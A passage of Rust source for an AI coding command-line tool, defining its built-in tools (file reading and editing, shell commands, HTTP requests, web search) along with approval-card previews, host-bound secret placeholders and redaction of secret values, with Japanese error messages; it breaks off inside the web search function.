//! The built-in tools: their definitions for the model, what a call would do (for the permission
//! check and the approval card), and running them.
//!
//! Tools that talk to the user or change the CLI itself (`ask_user`, `update_plan`, `get_settings`,
//! `update_settings`, `delegate`) and MCP tools are run by the controller; their definitions are here
//! so the model sees one list.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::time::Duration;

use serde_json::{Map, Value, json};
use tokio_util::sync::CancellationToken;

use crate::llm::ToolSpec;
use crate::permissions::{ToolKind, resolve};
use crate::secrets::{self, placeholders, redaction};
use crate::settings::Settings;
use crate::theme::{Style, Token, paint};

/// A secret the model may name: its value and where it may go.
#[derive(Clone, Debug)]
pub struct BookEntry {
    pub value: String,
    pub hosts: Vec<String>,
    pub kind: &'static str,
}

/// The secrets as the tools see them; only ids the model may use are in it.
#[derive(Clone, Debug, Default)]
pub struct Book {
    pub entries: BTreeMap<String, BookEntry>,
    /// every value (also those the model may not use), for redaction
    pub all_values: BTreeMap<String, String>,
}

impl Book {
    pub fn ids(&self) -> Vec<String> {
        self.entries.keys().cloned().collect()
    }
    pub fn redact(&self, text: &str) -> String {
        if self.all_values.is_empty() { text.to_string() } else { redaction::redact(text, &self.all_values, false) }
    }
}

pub struct Env<'a> {
    pub cwd: &'a Path,
    pub roots: &'a [PathBuf],
    pub settings: &'a Settings,
    pub book: &'a Book,
    pub client: &'a reqwest::Client,
    pub cancel: &'a CancellationToken,
}

/// What a call would do.
#[derive(Clone, Debug)]
pub struct Prepared {
    pub kind: ToolKind,
    /// what permission rules are matched against
    pub subjects: Vec<String>,
    pub outside: bool,
    pub secret: bool,
    /// the tool line (`src/main.rs`, `$ cargo test`)
    pub summary: String,
    /// the approval card
    pub title: String,
    pub detail: String,
    /// files the call changes (kept before it runs, for /undo)
    pub writes: Vec<PathBuf>,
}

impl Prepared {
    fn new(kind: ToolKind, summary: String) -> Prepared {
        Prepared {
            kind,
            subjects: vec![],
            outside: false,
            secret: false,
            title: summary.clone(),
            summary,
            detail: String::new(),
            writes: vec![],
        }
    }
}

#[derive(Clone, Debug)]
pub struct Output {
    pub content: String,
    pub ok: bool,
    /// one line for the screen
    pub summary: String,
    /// the content came from outside (a web page, an HTTP answer)
    pub external: bool,
}

impl Output {
    pub fn ok(content: String, summary: String) -> Output {
        Output { content, ok: true, summary, external: false }
    }
    pub fn err(msg: impl Into<String>) -> Output {
        let m = msg.into();
        Output { content: format!("Error: {m}"), ok: false, summary: m, external: false }
    }
}

fn obj(props: Value, required: &[&str]) -> Value {
    json!({ "type": "object", "properties": props, "required": required })
}

/// Every tool definition the CLI has (the controller filters by agent, mode and settings).
pub fn specs() -> Vec<ToolSpec> {
    let t = |name: &str, description: &str, parameters: Value| ToolSpec { name: name.into(), description: description.into(), parameters };
    vec![
        t(
            "read_file",
            "Read a text file. Lines are numbered. Use offset/limit (1-based lines) for long files.",
            obj(
                json!({ "path": {"type":"string"}, "offset": {"type":"integer","minimum":1}, "limit": {"type":"integer","minimum":1} }),
                &["path"],
            ),
        ),
        t(
            "list_dir",
            "List a folder (folders end with /).",
            obj(json!({ "path": {"type":"string","description":"default: the working folder"} }), &[]),
        ),
        t(
            "glob",
            "Find files by a glob pattern (e.g. src/**/*.rs), newest first. .gitignore is respected.",
            obj(json!({ "pattern": {"type":"string"}, "path": {"type":"string"} }), &["pattern"]),
        ),
        t(
            "grep",
            "Search file contents with a regular expression. Returns path:line: text.",
            obj(
                json!({ "pattern": {"type":"string"}, "path": {"type":"string"}, "glob": {"type":"string","description":"only files matching, e.g. *.rs"}, "ignore_case": {"type":"boolean"} }),
                &["pattern"],
            ),
        ),
        t(
            "write_file",
            "Create or overwrite a whole file. Prefer edit_file for changes to an existing file.",
            obj(json!({ "path": {"type":"string"}, "content": {"type":"string"} }), &["path", "content"]),
        ),
        t(
            "edit_file",
            "Replace text in a file. old_string must appear exactly once unless replace_all is true; include enough surrounding lines to make it unique.",
            obj(
                json!({ "path": {"type":"string"}, "old_string": {"type":"string"}, "new_string": {"type":"string"}, "replace_all": {"type":"boolean"} }),
                &["path", "old_string", "new_string"],
            ),
        ),
        t(
            "run_command",
            "Run a shell command in the working folder and return its exit code and output. Do not start servers that never end here; never wait with a fixed sleep. A secret goes in as {{secret:ID}} in the command or as the environment variable ARCE_SECRET_<ID> when listed in secrets.",
            obj(
                json!({ "command": {"type":"string"}, "timeout_seconds": {"type":"integer"}, "secrets": {"type":"array","items":{"type":"string"}} }),
                &["command"],
            ),
        ),
        t(
            "http_request",
            "Send an HTTP request (like curl) and return the status, headers and body. A secret goes in as {{secret:ID}} in the URL after the host, a header value, or the body; it may only go to the hosts bound to it.",
            obj(
                json!({ "method": {"type":"string"}, "url": {"type":"string"}, "headers": {"type":"object","additionalProperties":{"type":"string"}}, "body": {"type":"string"}, "json": {}, "timeout_seconds": {"type":"integer"} }),
                &["url"],
            ),
        ),
        t("web_search", "Search the web. Returns titles, URLs and snippets.", obj(json!({ "query": {"type":"string"} }), &["query"])),
        t(
            "ask_user",
            "Ask the user a question and wait for the answer. Give options when there are a few clear choices.",
            obj(json!({ "question": {"type":"string"}, "options": {"type":"array","items":{"type":"string"}} }), &["question"]),
        ),
        t(
            "update_plan",
            "Show the user your plan as a checklist and keep it current. Statuses: pending, in_progress, completed.",
            obj(
                json!({ "items": {"type":"array","items": obj(json!({ "step": {"type":"string"}, "status": {"type":"string","enum":["pending","in_progress","completed"]} }), &["step","status"])} }),
                &["items"],
            ),
        ),
        t(
            "get_settings",
            "Read the settings that can be changed from the chat, the models, and the secret ids you may use (never their values).",
            obj(json!({}), &[]),
        ),
        t(
            "update_settings",
            "Propose changes to settings (1 to 6). Nothing changes until the user approves.",
            obj(
                json!({ "changes": {"type":"array","minItems":1,"maxItems":6,"items": obj(json!({ "key": {"type":"string"}, "value": {} }), &["key","value"])} }),
                &["changes"],
            ),
        ),
        t(
            "delegate",
            "Coding mode: hand a big job to the developer models. Split it into small tasks; plan is a Mermaid flowchart (an arrow a --> b means b needs a's result). To fix a result, call again with revise.",
            obj(
                json!({
                    "plan": {"type":"string","description":"Mermaid flowchart TD; one node id[\"title\"] per task"},
                    "summary": {"type":"string","description":"what every task must agree on: names, signatures, data formats"},
                    "tasks": {"type":"array","items": obj(json!({ "id": {"type":"string"}, "title": {"type":"string"}, "instructions": {"type":"string"}, "depends_on": {"type":"array","items":{"type":"string"}}, "files": {"type":"array","items":{"type":"string"}} }), &["id","title","instructions"])},
                    "revise": obj(json!({ "id": {"type":"string","description":"a result id such as d3"}, "feedback": {"type":"string"} }), &["id","feedback"]),
                }),
                &[],
            ),
        ),
    ]
}

fn s<'a>(a: &'a Map<String, Value>, k: &str) -> Option<&'a str> {
    a.get(k).and_then(Value::as_str)
}

fn need<'a>(a: &'a Map<String, Value>, k: &str) -> Result<&'a str, String> {
    s(a, k).filter(|v| !v.is_empty()).ok_or_else(|| format!("引数 {k} がありません"))
}

/// A path for the screen: relative to the working folder when inside it.
pub fn shown_path(cwd: &Path, p: &Path) -> String {
    p.strip_prefix(cwd)
        .map(|r| if r.as_os_str().is_empty() { ".".into() } else { r.display().to_string() })
        .unwrap_or_else(|_| p.display().to_string())
}

fn path_of(env: &Env, a: &Map<String, Value>, key: &str, default_cwd: bool) -> Result<PathBuf, String> {
    match s(a, key).filter(|p| !p.trim().is_empty()) {
        Some(p) => Ok(resolve(env.cwd, p.trim())),
        None if default_cwd => Ok(env.cwd.to_path_buf()),
        None => Err(format!("引数 {key} がありません")),
    }
}

fn inside(env: &Env, p: &Path) -> bool {
    env.roots.iter().any(|r| p.starts_with(r))
}

/// A unified diff of [old] → [new] for the approval card, coloured, at most [max] lines.
pub fn diff(old: &str, new: &str, max: usize) -> String {
    let d = similar::TextDiff::from_lines(old, new);
    let mut out = vec![];
    for hunk in d.unified_diff().context_radius(2).iter_hunks() {
        out.push(paint(&hunk.header().to_string(), Style::fg(Token::Faint)));
        for change in hunk.iter_changes() {
            let line = change.value().trim_end_matches('\n');
            out.push(match change.tag() {
                similar::ChangeTag::Delete => paint(&format!("- {line}"), Style::fg(Token::Red)),
                similar::ChangeTag::Insert => paint(&format!("+ {line}"), Style::fg(Token::Green)),
                similar::ChangeTag::Equal => paint(&format!("  {line}"), Style::fg(Token::Faint)),
            });
        }
    }
    if out.len() > max {
        let more = out.len() - max;
        out.truncate(max);
        out.push(paint(&format!("…ほか {more} 行"), Style::fg(Token::Faint)));
    }
    out.join("\n")
}

/// (+added, -removed) lines.
pub fn diff_counts(old: &str, new: &str) -> (usize, usize) {
    let d = similar::TextDiff::from_lines(old, new);
    let mut add = 0;
    let mut del = 0;
    for c in d.iter_all_changes() {
        match c.tag() {
            similar::ChangeTag::Insert => add += 1,
            similar::ChangeTag::Delete => del += 1,
            _ => {}
        }
    }
    (add, del)
}

/// [text] cut to [max] characters, keeping the start and the end.
pub fn clip_middle(text: &str, max: usize) -> String {
    let n = text.chars().count();
    if n <= max {
        return text.to_string();
    }
    let head = max * 2 / 3;
    let tail = max - head;
    let h: String = text.chars().take(head).collect();
    let t: String = text.chars().skip(n - tail).collect();
    format!("{h}\n[… {} characters left out …]\n{t}", n - max)
}

fn edited(content: &str, a: &Map<String, Value>) -> Result<(String, usize), String> {
    let old = s(a, "old_string").ok_or("引数 old_string がありません")?;
    let new = s(a, "new_string").ok_or("引数 new_string がありません")?;
    if old.is_empty() {
        return Err("old_string が空です（新しいファイルは write_file で書きます）".into());
    }
    if old == new {
        return Err("old_string と new_string が同じです".into());
    }
    let count = content.matches(old).count();
    let all = a.get("replace_all").and_then(Value::as_bool).unwrap_or(false);
    match count {
        0 => {
            let hint = if content.contains(old.trim()) { "（前後の空白や改行が違います）" } else { "" };
            Err(format!("old_string がファイルの中に見つかりません{hint}。read_file で今の内容を確かめてください"))
        }
        n if n > 1 && !all => {
            Err(format!("old_string が {n} か所にあります。前後の行を足して 1 か所にするか、replace_all を true にしてください"))
        }
        n => Ok((if all { content.replace(old, new) } else { content.replacen(old, new, 1) }, n)),
    }
}

fn read_text(path: &Path) -> Result<String, String> {
    let bytes = std::fs::read(path).map_err(|e| format!("{} を読めません: {e}", path.display()))?;
    if bytes.iter().take(8192).any(|b| *b == 0) {
        return Err(format!("{} はテキストではありません（バイナリ）", path.display()));
    }
    Ok(String::from_utf8_lossy(&bytes).into_owned())
}

/// What a call of a built-in tool would do; Err is told to the model.
pub fn prepare(name: &str, a: &Map<String, Value>, env: &Env) -> Result<Prepared, String> {
    match name {
        "read_file" | "list_dir" | "glob" | "grep" => {
            let p = path_of(env, a, "path", name != "read_file")?;
            let mut prep = Prepared::new(ToolKind::Read, String::new());
            prep.summary = match name {
                "glob" => format!("{} in {}", need(a, "pattern")?, shown_path(env.cwd, &p)),
                "grep" => format!("/{}/ in {}", need(a, "pattern")?, shown_path(env.cwd, &p)),
                _ => shown_path(env.cwd, &p),
            };
            prep.title = format!("{} を読みます", p.display());
            prep.outside = !inside(env, &p);
            prep.subjects = vec![p.display().to_string()];
            Ok(prep)
        }
        "write_file" | "edit_file" => {
            let p = path_of(env, a, "path", false)?;
            let shown = shown_path(env.cwd, &p);
            let old = if p.exists() { read_text(&p)? } else { String::new() };
            let new = if name == "write_file" {
                s(a, "content").ok_or("引数 content がありません")?.to_string()
            } else {
                if !p.exists() {
                    return Err(format!("{shown} がありません（新しいファイルは write_file で書きます）"));
                }
                edited(&old, a)?.0
            };
            let (add, del) = diff_counts(&old, &new);
            let mut prep = Prepared::new(ToolKind::Write, format!("{shown} (+{add} -{del})"));
            prep.title = if p.exists() {
                format!("{shown} を書き換えます（+{add} -{del}）")
            } else {
                format!("{shown} を新しく作ります（{add} 行）")
            };
            prep.detail = diff(&old, &new, 80);
            prep.outside = !inside(env, &p);
            prep.subjects = vec![shown.clone(), p.display().to_string()];
            prep.writes = vec![p];
            Ok(prep)
        }
        "run_command" => {
            let cmd = need(a, "command")?;
            let ids = secret_ids_for_command(a);
            check_secret_ids(&ids, env.book)?;
            let timeout = command_timeout(a, env.settings);
            let mut prep = Prepared::new(ToolKind::Command, format!("$ {}", one_line(cmd, 120)));
            prep.title = format!("$ {cmd}");
            prep.detail = format!("場所: {}  最大 {timeout} 秒", env.cwd.display());
            if !ids.is_empty() {
                prep.detail.push_str(&format!("\n秘密: {}", ids.join(", ")));
            }
            prep.secret = !ids.is_empty();
            prep.subjects = vec![cmd.to_string()];
            Ok(prep)
        }
        "http_request" => {
            let url = need(a, "url")?;
            let method = s(a, "method").unwrap_or("GET").to_uppercase();
            let ids = http_secret_ids(a);
            check_secret_ids(&ids, env.book)?;
            if !ids.is_empty() {
                check_secret_destination(url, &ids, env)?;
            }
            let host = reqwest::Url::parse(url).ok().and_then(|u| u.host_str().map(str::to_string)).unwrap_or_default();
            let mut prep = Prepared::new(ToolKind::Network, format!("{method} {}", one_line(url, 100)));
            prep.title = format!("{method} {url}");
            if let Some(Value::Object(h)) = a.get("headers") {
                for (k, v) in h {
                    prep.detail.push_str(&format!("{k}: {}\n", v.as_str().unwrap_or("")));
                }
            }
            if let Some(b) = s(a, "body").map(str::to_string).or_else(|| a.get("json").map(|j| j.to_string())) {
                prep.detail.push_str(&clip_middle(&b, 1200));
            }
            if !ids.is_empty() {
                prep.detail.push_str(&format!("\n秘密: {}（値はここにも出しません）", ids.join(", ")));
            }
            prep.secret = !ids.is_empty();
            prep.subjects = vec![host, url.to_string()];
            Ok(prep)
        }
        "web_search" => {
            let q = need(a, "query")?;
            Ok(Prepared::new(ToolKind::Interaction, format!("「{}」", one_line(q, 80))))
        }
        other => Err(format!("{other} という道具はありません")),
    }
}

fn one_line(text: &str, max: usize) -> String {
    let flat = text.split_whitespace().collect::<Vec<_>>().join(" ");
    if flat.chars().count() <= max { flat } else { format!("{}…", flat.chars().take(max).collect::<String>()) }
}

fn command_timeout(a: &Map<String, Value>, settings: &Settings) -> u64 {
    a.get("timeout_seconds")
        .and_then(Value::as_u64)
        .unwrap_or(settings.limits.command_timeout_secs)
        .clamp(1, settings.limits.command_max_timeout_secs.max(1))
}

fn secret_ids_for_command(a: &Map<String, Value>) -> Vec<String> {
    let mut ids = placeholders::ids_in(s(a, "command").unwrap_or(""));
    if let Some(Value::Array(list)) = a.get("secrets") {
        for v in list.iter().filter_map(Value::as_str) {
            let id = v.trim().to_lowercase();
            if !ids.contains(&id) {
                ids.push(id);
            }
        }
    }
    ids
}

fn http_secret_ids(a: &Map<String, Value>) -> Vec<String> {
    let mut text = s(a, "url").unwrap_or("").to_string();
    if let Some(Value::Object(h)) = a.get("headers") {
        for (k, v) in h {
            text.push_str(k);
            text.push_str(v.as_str().unwrap_or(""));
        }
    }
    text.push_str(s(a, "body").unwrap_or(""));
    if let Some(j) = a.get("json") {
        text.push_str(&j.to_string());
    }
    placeholders::ids_in(&text)
}

fn check_secret_ids(ids: &[String], book: &Book) -> Result<(), String> {
    let missing: Vec<&String> = ids.iter().filter(|id| !book.entries.contains_key(*id)).collect();
    if missing.is_empty() {
        return Ok(());
    }
    let known = book.ids();
    Err(format!(
        "秘密 {} は使えません（無いか、モデルに使わせない設定です）。使える名前: {}",
        missing.iter().map(|s| s.as_str()).collect::<Vec<_>>().join(", "),
        if known.is_empty() { "なし".to_string() } else { known.join(", ") }
    ))
}

/// A secret may be in the URL only after the host, and the host must be bound to every secret used.
fn check_secret_destination(url: &str, ids: &[String], env: &Env) -> Result<(), String> {
    let authority_end = url.find("://").map(|i| i + 3).map(|start| start + url[start..].find(['/', '?', '#']).unwrap_or(url.len() - start));
    if let Some(end) = authority_end
        && placeholders::has_any(&url[..end])
    {
        return Err("秘密はホスト名やスキームには書けません（パス・クエリ・ヘッダの値・本文だけ）".into());
    }
    let final_url = placeholders::substitute(url, |_| Some("x".into()));
    for id in ids {
        let entry = &env.book.entries[id];
        if let Some(problem) = secrets::hosts::problem(&final_url, &entry.hosts, env.settings.permissions.http_allow_insecure) {
            return Err(format!("{id}: {problem}"));
        }
    }
    Ok(())
}

/// Runs a built-in tool that [prepare] accepted.
pub async fn run(name: &str, a: &Map<String, Value>, env: &Env<'_>) -> Output {
    match name {
        "read_file" => read_file(a, env),
        "list_dir" => list_dir(a, env),
        "glob" => glob(a, env),
        "grep" => grep(a, env),
        "write_file" => write_file(a, env),
        "edit_file" => edit_file(a, env),
        "run_command" => run_command(a, env).await,
        "http_request" => http_request(a, env).await,
        "web_search" => web_search(a, env).await,
        other => Output::err(format!("{other} という道具はありません")),
    }
}

fn read_file(a: &Map<String, Value>, env: &Env) -> Output {
    let p = match path_of(env, a, "path", false) {
        Ok(p) => p,
        Err(e) => return Output::err(e),
    };
    if p.is_dir() {
        return Output::err(format!("{} はフォルダです（list_dir を使います）", p.display()));
    }
    let text = match read_text(&p) {
        Ok(t) => t,
        Err(e) => return Output::err(e),
    };
    let total = text.lines().count();
    let offset = a.get("offset").and_then(Value::as_u64).unwrap_or(1).max(1) as usize;
    let limit = a.get("limit").and_then(Value::as_u64).map(|n| n as usize).unwrap_or(env.settings.limits.read_default_lines);
    let mut out = String::new();
    let mut shown = 0;
    for (i, line) in text.lines().enumerate().skip(offset - 1).take(limit) {
        out.push_str(&format!("{:>6}│{}\n", i + 1, line));
        shown += 1;
        if out.len() > env.settings.limits.read_max_chars {
            out.push_str(&format!("[… 文字数の上限です。offset={} から続きを読めます]\n", i + 2));
            break;
        }
    }
    if offset - 1 + shown < total && !out.ends_with("]\n") {
        out.push_str(&format!("[全 {total} 行のうち {offset}〜{} 行。続きは offset={}]\n", offset - 1 + shown, offset + shown));
    }
    if total == 0 {
        out = "（空のファイル）".into();
    }
    Output::ok(env.book.redact(&out), format!("{shown} 行"))
}

fn list_dir(a: &Map<String, Value>, env: &Env) -> Output {
    let p = match path_of(env, a, "path", true) {
        Ok(p) => p,
        Err(e) => return Output::err(e),
    };
    let rd = match std::fs::read_dir(&p) {
        Ok(r) => r,
        Err(e) => return Output::err(format!("{} を開けません: {e}", p.display())),
    };
    let mut items: Vec<(bool, String, u64)> = rd
        .flatten()
        .filter(|e| e.file_name() != ".git")
        .map(|e| {
            let md = e.metadata().ok();
            (md.as_ref().is_some_and(|m| m.is_dir()), e.file_name().to_string_lossy().into_owned(), md.map_or(0, |m| m.len()))
        })
        .collect();
    items.sort_by(|x, y| y.0.cmp(&x.0).then(x.1.cmp(&y.1)));
    let n = items.len();
    let out: String = items
        .into_iter()
        .take(1000)
        .map(|(dir, name, size)| if dir { format!("{name}/\n") } else { format!("{name}  ({size} B)\n") })
        .collect();
    Output::ok(if out.is_empty() { "（空）".into() } else { out }, format!("{n} 件"))
}

fn walker(root: &Path) -> ignore::Walk {
    ignore::WalkBuilder::new(root).hidden(false).filter_entry(|e| e.file_name() != ".git").build()
}

fn glob(a: &Map<String, Value>, env: &Env) -> Output {
    let root = match path_of(env, a, "path", true) {
        Ok(p) => p,
        Err(e) => return Output::err(e),
    };
    let pattern = s(a, "pattern").unwrap_or("*");
    let matcher = match globset::GlobBuilder::new(pattern).literal_separator(false).build() {
        Ok(g) => g.compile_matcher(),
        Err(e) => return Output::err(format!("パターンが読めません: {e}")),
    };
    let mut hits: Vec<(std::time::SystemTime, String)> = vec![];
    for e in walker(&root).flatten() {
        if !e.file_type().is_some_and(|t| t.is_file()) {
            continue;
        }
        let rel = e.path().strip_prefix(&root).unwrap_or(e.path());
        if matcher.is_match(rel) || matcher.is_match(e.file_name()) {
            let t = e.metadata().ok().and_then(|m| m.modified().ok()).unwrap_or(std::time::UNIX_EPOCH);
            hits.push((t, shown_path(env.cwd, e.path())));
        }
    }
    hits.sort_by_key(|h| std::cmp::Reverse(h.0));
    let n = hits.len();
    let max = env.settings.limits.glob_max_results;
    let mut out: String = hits.into_iter().take(max).map(|(_, p)| p + "\n").collect();
    if n > max {
        out.push_str(&format!("[ほか {} 件]\n", n - max));
    }
    Output::ok(if n == 0 { "（見つかりません）".into() } else { out }, format!("{n} 件"))
}

fn grep(a: &Map<String, Value>, env: &Env) -> Output {
    let root = match path_of(env, a, "path", true) {
        Ok(p) => p,
        Err(e) => return Output::err(e),
    };
    let pattern = s(a, "pattern").unwrap_or("");
    let re =
        match regex::RegexBuilder::new(pattern).case_insensitive(a.get("ignore_case").and_then(Value::as_bool).unwrap_or(false)).build() {
            Ok(r) => r,
            Err(e) => return Output::err(format!("正規表現が読めません: {e}")),
        };
    let filter = match s(a, "glob") {
        Some(g) => match globset::Glob::new(g) {
            Ok(g) => Some(g.compile_matcher()),
            Err(e) => return Output::err(format!("glob が読めません: {e}")),
        },
        None => None,
    };
    let max = env.settings.limits.grep_max_results;
    let mut out = String::new();
    let mut count = 0usize;
    let mut files = 0usize;
    let paths: Vec<PathBuf> = if root.is_file() {
        vec![root.clone()]
    } else {
        walker(&root).flatten().filter(|e| e.file_type().is_some_and(|t| t.is_file())).map(|e| e.into_path()).collect()
    };
    'files: for path in paths {
        if let Some(f) = &filter
            && !f.is_match(path.file_name().unwrap_or_default())
            && !f.is_match(path.strip_prefix(&root).unwrap_or(&path))
        {
            continue;
        }
        let Ok(bytes) = std::fs::read(&path) else { continue };
        if bytes.iter().take(8192).any(|b| *b == 0) {
            continue;
        }
        let text = String::from_utf8_lossy(&bytes);
        let mut hit = false;
        for (i, line) in text.lines().enumerate() {
            if re.is_match(line) {
                if !hit {
                    files += 1;
                    hit = true;
                }
                count += 1;
                if count > max {
                    break 'files;
                }
                let line: String = line.chars().take(300).collect();
                out.push_str(&format!("{}:{}: {}\n", shown_path(env.cwd, &path), i + 1, line));
            }
        }
    }
    if count > max {
        out.push_str(&format!("[上限 {max} 件で止めました。path や glob で絞ってください]\n"));
    }
    let summary = format!("{} 件（{files} ファイル）", count.min(max));
    Output::ok(if count == 0 { "（一致なし）".into() } else { env.book.redact(&out) }, summary)
}

fn write_file(a: &Map<String, Value>, env: &Env) -> Output {
    let p = match path_of(env, a, "path", false) {
        Ok(p) => p,
        Err(e) => return Output::err(e),
    };
    let content = s(a, "content").unwrap_or("");
    let existed = p.exists();
    let old = if existed { std::fs::read_to_string(&p).unwrap_or_default() } else { String::new() };
    if let Some(dir) = p.parent()
        && let Err(e) = std::fs::create_dir_all(dir)
    {
        return Output::err(format!("フォルダを作れません: {e}"));
    }
    if let Err(e) = std::fs::write(&p, content) {
        return Output::err(format!("{} に書けません: {e}", p.display()));
    }
    let (add, del) = diff_counts(&old, content);
    let shown = shown_path(env.cwd, &p);
    let what = if existed { "書き換えました" } else { "作りました" };
    Output::ok(format!("{shown} を{what}（+{add} -{del}、{} 行）", content.lines().count()), format!("{what} +{add} -{del}"))
}

fn edit_file(a: &Map<String, Value>, env: &Env) -> Output {
    let p = match path_of(env, a, "path", false) {
        Ok(p) => p,
        Err(e) => return Output::err(e),
    };
    let old = match read_text(&p) {
        Ok(t) => t,
        Err(e) => return Output::err(e),
    };
    let (new, n) = match edited(&old, a) {
        Ok(x) => x,
        Err(e) => return Output::err(e),
    };
    if let Err(e) = std::fs::write(&p, &new) {
        return Output::err(format!("{} に書けません: {e}", p.display()));
    }
    let (add, del) = diff_counts(&old, &new);
    // the lines around the change, so the model sees the result without reading again
    let at = new.find(s(a, "new_string").unwrap_or("")).unwrap_or(0);
    let line_no = new[..at].lines().count().max(1);
    let snippet: String = new
        .lines()
        .enumerate()
        .skip(line_no.saturating_sub(3))
        .take(s(a, "new_string").unwrap_or("").lines().count() + 5)
        .map(|(i, l)| format!("{:>6}│{l}\n", i + 1))
        .collect();
    let shown = shown_path(env.cwd, &p);
    Output::ok(format!("{shown} を直しました（{n} か所、+{add} -{del}）\n{snippet}"), format!("+{add} -{del}"))
}

async fn run_command(a: &Map<String, Value>, env: &Env<'_>) -> Output {
    let raw = s(a, "command").unwrap_or("");
    let ids = secret_ids_for_command(a);
    let cmd = placeholders::substitute(raw, |id| env.book.entries.get(id).map(|e| e.value.clone()));
    let timeout = command_timeout(a, env.settings);
    let mut c = if cfg!(windows) {
        let mut c = tokio::process::Command::new("cmd");
        c.arg("/C").arg(&cmd);
        c
    } else {
        let mut c = tokio::process::Command::new("sh");
        c.arg("-c").arg(&cmd);
        c
    };
    c.current_dir(env.cwd)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .kill_on_drop(true);
    c.env("ARCE_CLI", "1");
    for id in &ids {
        if let Some(e) = env.book.entries.get(id) {
            c.env(secrets::env_name(id), &e.value);
        }
    }
    let child = match c.spawn() {
        Ok(ch) => ch,
        Err(e) => return Output::err(format!("コマンドを始められません: {e}")),
    };
    let started = std::time::Instant::now();
    let result = tokio::select! {
        _ = env.cancel.cancelled() => return Output::err("止めました"),
        r = tokio::time::timeout(Duration::from_secs(timeout), child.wait_with_output()) => r,
    };
    let out = match result {
        Err(_) => {
            return Output::err(format!(
                "{timeout} 秒で終わらなかったので止めました（長く動かすものは timeout_seconds を大きくするか、別の端末で動かします）"
            ));
        }
        Ok(Err(e)) => return Output::err(format!("コマンドが失敗しました: {e}")),
        Ok(Ok(o)) => o,
    };
    let code = out.status.code();
    let stdout = String::from_utf8_lossy(&out.stdout);
    let stderr = String::from_utf8_lossy(&out.stderr);
    let max = env.settings.limits.command_max_output_chars;
    let mut text = format!("exit code: {}\n", code.map_or("(signal)".into(), |c| c.to_string()));
    if !stdout.trim().is_empty() {
        text.push_str(&format!("--- stdout ---\n{}\n", clip_middle(stdout.trim_end(), max)));
    }
    if !stderr.trim().is_empty() {
        text.push_str(&format!("--- stderr ---\n{}\n", clip_middle(stderr.trim_end(), max / 2)));
    }
    let ok = out.status.success();
    let lines = stdout.lines().count() + stderr.lines().count();
    let summary =
        format!("終了コード {} · {lines} 行 · {:.1}秒", code.map_or("-".into(), |c| c.to_string()), started.elapsed().as_secs_f64());
    Output { content: env.book.redact(&text), ok, summary, external: false }
}

async fn http_request(a: &Map<String, Value>, env: &Env<'_>) -> Output {
    let ids = http_secret_ids(a);
    let fill = |t: &str| placeholders::substitute(t, |id| env.book.entries.get(id).map(|e| e.value.clone()));
    let method = s(a, "method").unwrap_or("GET").to_uppercase();
    let Ok(method) = reqwest::Method::from_bytes(method.as_bytes()) else { return Output::err("method が読めません") };
    let mut url = match reqwest::Url::parse(&fill(s(a, "url").unwrap_or(""))) {
        Ok(u) if matches!(u.scheme(), "http" | "https") => u,
        _ => return Output::err("url は http(s) の完全なアドレスにしてください"),
    };
    let perms = &env.settings.permissions;
    let timeout = a.get("timeout_seconds").and_then(Value::as_u64).unwrap_or(perms.http_timeout_secs).clamp(1, 600);
    let client = match reqwest::Client::builder()
        .redirect(reqwest::redirect::Policy::none())
        .timeout(Duration::from_secs(timeout))
        .user_agent(concat!("arce-ai-cli/", env!("CARGO_PKG_VERSION")))
        .build()
    {
        Ok(c) => c,
        Err(e) => return Output::err(e.to_string()),
    };
    let mut headers = reqwest::header::HeaderMap::new();
    if let Some(Value::Object(h)) = a.get("headers") {
        for (k, v) in h {
            let (Ok(name), Ok(value)) = (
                reqwest::header::HeaderName::from_bytes(k.as_bytes()),
                reqwest::header::HeaderValue::from_str(&fill(v.as_str().unwrap_or(""))),
            ) else {
                return Output::err(format!("ヘッダー {k} が読めません"));
            };
            headers.insert(name, value);
        }
    }
    let mut body: Option<String> = s(a, "body").map(fill);
    if body.is_none()
        && let Some(j) = a.get("json")
    {
        body = Some(fill(&j.to_string()));
        headers.entry(reqwest::header::CONTENT_TYPE).or_insert(reqwest::header::HeaderValue::from_static("application/json"));
    }
    let mut method = method;
    let mut redirects = 0;
    let resp = loop {
        let mut req = client.request(method.clone(), url.clone()).headers(headers.clone());
        if let Some(b) = &body {
            req = req.body(b.clone());
        }
        let r = tokio::select! {
            _ = env.cancel.cancelled() => return Output::err("止めました"),
            r = req.send() => r,
        };
        let r = match r {
            Ok(r) => r,
            Err(e) => return Output::err(env.book.redact(&format!("送れませんでした: {e}"))),
        };
        if !r.status().is_redirection() {
            break r;
        }
        let Some(loc) = r.headers().get(reqwest::header::LOCATION).and_then(|v| v.to_str().ok()).and_then(|l| url.join(l).ok()) else {
            break r;
        };
        if redirects >= perms.http_max_redirects {
            return Output::err(format!("リダイレクトが {redirects} 回を超えました"));
        }
        if !ids.is_empty() && (loc.host_str() != url.host_str() || loc.scheme() != "https") {
            return Output::err(format!(
                "秘密を使うので、別のホストや http へのリダイレクト（{}）には従いません",
                loc.host_str().unwrap_or("")
            ));
        }
        if r.status() == reqwest::StatusCode::SEE_OTHER {
            method = reqwest::Method::GET;
            body = None;
        }
        url = loc;
        redirects += 1;
    };
    let status = resp.status();
    let mut text = format!("HTTP {}\n", status.as_u16());
    for name in ["content-type", "content-length", "retry-after", "location"] {
        if let Some(v) = resp.headers().get(name).and_then(|v| v.to_str().ok()) {
            text.push_str(&format!("{name}: {v}\n"));
        }
    }
    for (k, v) in resp.headers() {
        if k.as_str().starts_with("ratelimit") || k.as_str().starts_with("x-ratelimit") {
            text.push_str(&format!("{k}: {}\n", v.to_str().unwrap_or("")));
        }
    }
    let body_text = resp.text().await.unwrap_or_default();
    let n = body_text.chars().count();
    text.push('\n');
    text.push_str(&clip_middle(&body_text, perms.http_max_response_chars));
    let ok = status.is_success();
    let summary = format!("HTTP {} · {n} 文字", status.as_u16());
    Output { content: env.book.redact(&text), ok, summary, external: true }
}

async fn web_search(a: &Map<String, Value>, env: &Env<'_>) -> Output {
    let q = s(a, "query").unwrap_or("").trim();
    if q.is_empty() {
        return Output::err("query が空です");
    }
    let max = env.settings.search.max_results.max(1);
    let base = env.settings.search.searxng_url.trim().trim_end_matches('/');
    let mut lines = vec![];
    if !base.is_empty() {
        let url = format!("{base}/search");
        let r = env.client.get(&url).query(&[("q", q), ("format", "json")]).timeout(Duration::from_secs(20)).send().await;
        match r {
            Ok(r) if r.status().is_success() => {
